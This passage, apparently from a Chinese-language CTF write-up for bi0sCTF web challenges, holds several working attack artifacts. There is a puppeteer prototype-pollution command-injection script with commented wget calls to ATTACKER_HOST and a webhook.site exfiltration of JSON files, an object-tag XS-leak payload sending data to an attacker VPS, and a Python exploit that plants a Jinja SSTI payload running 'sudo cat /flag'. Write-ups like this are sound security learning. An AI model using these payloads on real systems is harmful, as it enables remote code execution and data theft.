        json<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token punctuation">{</span>
                    <span class="token string">"author"</span><span class="token punctuation">:</span> author<span class="token punctuation">,</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"Message"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"Settings changed"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text
    res <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span>


<span class="token comment" spellcheck="true"># PP gadgets in puppeteer:</span>
<span class="token comment" spellcheck="true"># - https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/browsers/src/launch.ts#L199-L207</span>
<span class="token comment" spellcheck="true"># - https://github.com/puppeteer/puppeteer/blob/puppeteer-v21.5.2/packages/puppeteer-core/src/node/ChromeLauncher.ts#L76-L83</span>

pp<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> <span class="token string">'"sh"'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#只执行一次，因为The "options.shell" property must be one of type boolean or string. Received an instance of Array</span>
<span class="token comment" spellcheck="true"># pp("executablePath",'"echo"')</span>
pp<span class="token punctuation">(</span><span class="token string">"userDataDir"</span><span class="token punctuation">,</span><span class="token string">'"a;calc;"'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#只有一次机会</span>


<span class="token comment" spellcheck="true"># pp("debuggingPort",'";calc;a="')</span>
<span class="token comment" spellcheck="true"># pp("debuggingPort", '";calc;a="')</span>
<span class="token comment" spellcheck="true"># pp("debuggingPort", f'";wget\\t{ATTACKER_HOST}/x;a="')</span>
<span class="token comment" spellcheck="true"># pp("debuggingPort", '";sh\\tx;"')</span>
<span class="token comment" spellcheck="true"># You need to serve the following shell script at `http://{ATTACKER_HOST}/x`:</span>
<span class="token comment" spellcheck="true">#     ```</span>
<span class="token comment" spellcheck="true">#     wget https://webhook.site/xxxxx --post-data="$(cat *.json)"</span>
<span class="token comment" spellcheck="true">#     ```</span>

res <span class="token operator">=</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"/healthcheck"</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"Message"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"healthcheck failed"</span>

<span class="token comment" spellcheck="true"># -> {"title":"flag","content":"bi0sctf{riDPzbM5H7l3JAex+mw2vA==}"}{"title":"Healthcheck","content":"success"}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709105297213.jpg" alt="1709105297213"></p>
<h5 id="预期解（未分析完）"><a href="#预期解（未分析完）" class="headerlink" title="预期解（未分析完）"></a>预期解（未分析完）</h5><p>预期解就比较巧妙了，巧妙到看不懂:)</p>
<h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><p>这里需要几个前置知识：</p>
<p>对于<code>nodejs</code>来说<code>require</code>一个模块是有缓存的，第一次加载模块后将对其进行缓存，每次对<code>require(&#39;test&#39;)</code>的调用都将返回完全相同的对象，缓存提高了模块加载的效率，特别是对于频繁被多个其他模块依赖和引用的模块。。为了删除缓存可以通过<code>require.cache</code>，其键是已加载模块的完整路径，而值是模块的导出对象。</p>
<p>而<code>module.constructor._pathCache</code>大概可以理解为用于减少重复的文件系统操作。比如<code>require.resolve</code> 函数用于解析模块的路径，但不加载模块本身。它返回解析后的模块的绝对路径。这个解析过程可能会涉及到文件系统的多次访问，特别是当搜索 <code>node_modules</code> 目录和处理包的 <code>package.json</code> 文件时。为了提高这个过程的效率，<code>Node.js</code> 会缓存解析过程的结果，这样当再次请求相同模块的解析时，可以直接返回缓存的路径，而不是重新进行解析。</p>
<p>而在<code>require</code>中，还有一些小细节值得学习。</p>
<ul>
<li><strong>模块标识（<code>data.name</code>）</strong>：指的模块的名称或路径，用于唯一标识一个模块。在 <code>Node.js</code> 中，模块标识通常是模块的文件路径或安装的包名称。</li>
<li><strong>模块导出（<code>data.exports</code>）</strong>：在 <code>Node.js</code> 模块系统中，每个模块都可以导出对象、函数、类等，使它们可以被其他模块通过 <code>require</code> 函数导入。这是通过模块的 <code>module.exports</code> 属性实现的。模块的导出对象是其他模块通过 <code>require</code> 函数获取的值。</li>
</ul>
<h6 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h6><p>关键有三个路由</p>
<p><code>/view/:noteId</code>用来看笔记，不过比较逆天的是首先用<code>require.resolve</code>解析<code>note</code>的路径，随后通过<code>require(./notes/$&#123;noteId&#125;)</code>获取<code>note</code>内容。另外只要传个<code>temp</code>就能删除指定的笔记，感觉这两点很有用。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/view/:noteId'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> noteId <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">;</span>

  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> note<span class="token operator">=</span>require<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".json"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> noteData <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"./notes/"</span><span class="token operator">+</span>noteId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>noteId<span class="token operator">+</span><span class="token string">".json"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>noteId<span class="token operator">===</span>healthCheckId<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">cleanserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">delete</span> module<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>temp <span class="token operator">!==</span> undefined<span class="token punctuation">)</span><span class="token punctuation">{</span>
      fs<span class="token punctuation">.</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>unlinkError<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>unlinkError<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'File missing'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        noteList<span class="token operator">=</span>noteList<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>value<span class="token operator">!=</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'view'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> noteData <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal Server Error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第二个路由<code>/healthcheck</code>就是让<code>bot</code>访问<code>helthcheck.json</code>这个文件了。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">healthCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> response<span class="token operator">=</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/view/Healthcheck"</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第三个路由<code>/search/:noteId</code>可以匹配爆破<code>flag</code>路径。</p>
<pre class="line-numbers language-js"><code class="language-js"> flag<span class="token operator">=</span><span class="token template-string"><span class="token string">`{"title":"flag","content":"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flag<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"}`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> flagid <span class="token operator">=</span> <span class="token function">generateNoteId</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>flagid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/search/:noteId'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> noteId <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">;</span>
  <span class="token keyword">const</span> notes<span class="token operator">=</span>glob<span class="token punctuation">.</span><span class="token function">sync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">*`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>notes<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>Message<span class="token punctuation">:</span> <span class="token string">"Not found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
      fs<span class="token punctuation">.</span><span class="token function">accessSync</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./notes/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.json`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>Message<span class="token punctuation">:</span> <span class="token string">"Note found"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以我们肯定是要借助<code>search</code>来爆破<code>flag</code>的<code>path</code>的，但是<code>search</code>只能本地访问。而<code>bot</code>只是访问<code>http://localhost:3000/view/Healthcheck</code>。我们的目标肯定是篡改<code>Healthcheck</code>的内容从而打<code>xs-leak</code>。</p>
<h6 id="修改require缓存"><a href="#修改require缓存" class="headerlink" title="修改require缓存"></a>修改require缓存</h6><p>这步看不懂，后面再补吧。。</p>
<h6 id="SSLEAK"><a href="#SSLEAK" class="headerlink" title="SSLEAK"></a>SSLEAK</h6><p><code>bot</code>禁用<code>js</code>，但是我们可以通过<code>Object</code>绕过，通过<code>search</code>逐位爆破出<code>flag</code>。</p>
<pre><code>&lt;object data=&#39;http://127.0.0.1:3000/search/&#123;A-z0-9&#125;&#39;&gt;&lt;object data=&#39;http://vpsip/found/&#123;i&#125;&#39;&gt;&lt;/object&gt;&lt;/object&gt;
</code></pre>
<h4 id="bad-notes"><a href="#bad-notes" class="headerlink" title="bad_notes"></a>bad_notes</h4><p>没来得及看，比赛的时候光看<code>image gallery</code>了。这题预期应该还是玩缓存？一眼<code>file = os.path.join(file_path,title)</code>，<code>title</code>那里可控有个任意文件上传。</p>
<p>通过<code>/makenote</code>传个<code>SSTI</code>覆盖<code>login.html</code>即可。</p>
<p>值得注意的是模版只要渲染一次就有缓存，因此打开靶机之后不要访问，直接<code>post</code>注册登陆即可。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64
url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:7000/"</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

user<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span>
<span class="token punctuation">}</span>
proxies<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8081"</span>
<span class="token punctuation">}</span>
files<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"/app/templates/login.html"</span><span class="token punctuation">,</span>
    <span class="token string">"content"</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token string">"{{g.pop.__globals__.__builtins__['__import__']('os').popen('sudo cat /flag').read()}}"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"register"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>user<span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>user<span class="token punctuation">)</span>
session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"makenote"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>files<span class="token punctuation">)</span>
r<span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="image-gallery1"><a href="#image-gallery1" class="headerlink" title="image gallery1"></a>image gallery1</h4><p>这题其实不算难，但是很巧妙。坐牢了四个小时完全没思路，只能说智商不够。</p>
<h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p><code>bot</code>题，点击<code>share</code>的话会把<code>flag sid</code>当成<code>cookie</code>。比较奇怪的是<code>bot</code>先访问了<code>/index</code>随后访问<code>index?f</code>渲染图片。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span>flag_id<span class="token punctuation">,</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    args<span class="token punctuation">:</span> <span class="token punctuation">[</span>
        <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>
        <span class="token string">"--headless"</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    executablePath<span class="token punctuation">:</span> <span class="token string">"/usr/bin/google-chrome"</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">try</span> <span class="token punctuation">{</span>

    <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      
            httpOnly<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
            name<span class="token punctuation">:</span> <span class="token string">'sid'</span><span class="token punctuation">,</span>
            value<span class="token punctuation">:</span> flag_id<span class="token punctuation">,</span>
            domain<span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>
      
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`http://localhost:3000/`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>
      <span class="token template-string"><span class="token string">`http://localhost:3000/?f=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">,</span>
      <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">5000</span> <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> visit <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>思路完全错了，我还在想<code>?f</code>渲染图片是不是要看<code>index.ejs</code>怎么渲染图片的，是不是能逃逸出一个属性从而打<code>XSS</code>。但实际上如果是<code>?f</code>那里能<code>XSS</code>的话<code>bot</code>就没必要访问两次了。并且<code>index.ejs</code>那里也究极安全。</p>
<pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">const</span> galleryDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.gallery'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> file <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> modal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bootstrap<span class="token punctuation">.</span>Modal</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'imageModal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> modalImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'modalImage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
